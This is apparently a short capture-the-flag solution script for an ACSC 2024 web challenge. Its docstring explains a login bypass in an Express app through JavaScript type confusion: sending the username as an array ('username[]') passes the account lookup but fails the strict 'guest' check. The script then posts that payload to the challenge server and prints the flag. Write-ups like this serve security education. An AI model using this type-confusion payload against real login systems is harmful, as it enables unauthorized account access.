"""
Yet another login bypass chall on JS equivalence

the main of source code is following. `user.password == password` is strange, but if `username === 'guest'` is false, can get the FLAG.
```js
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username.length > 6) return res.send('Username is too long');

    console.log(username)
    const user = USER_DB[username];
    console.log(user)
    if (user && user.password == password) {
        if (username === 'guest') {
            res.send('Welcome, guest. You do not have permission to view the flag');
        } else {
            res.send(`Welcome, ${username}. Here is your flag: ${FLAG}`);
        }
    } else {
        res.send('Invalid username or password');
    }
});
```

I sent crafted payload like `{"username[]": "guest", "password": "guest"}`, `username === 'guest'` return `false`.
```
username === 'guest' :  false
user.name === 'guest' :  true
```

"""

import httpx
import re

BASE_URL = "http://login-web.chal.2024.ctf.acsc.asia:5000"

data = {"username[]": "guest", "password": "guest"}
r = httpx.post(f"{BASE_URL}/login", data=data)

print(re.findall(r'ACSC{.+}', r.text)[0])
# ACSC{y3t_an0th3r_l0gin_byp4ss}
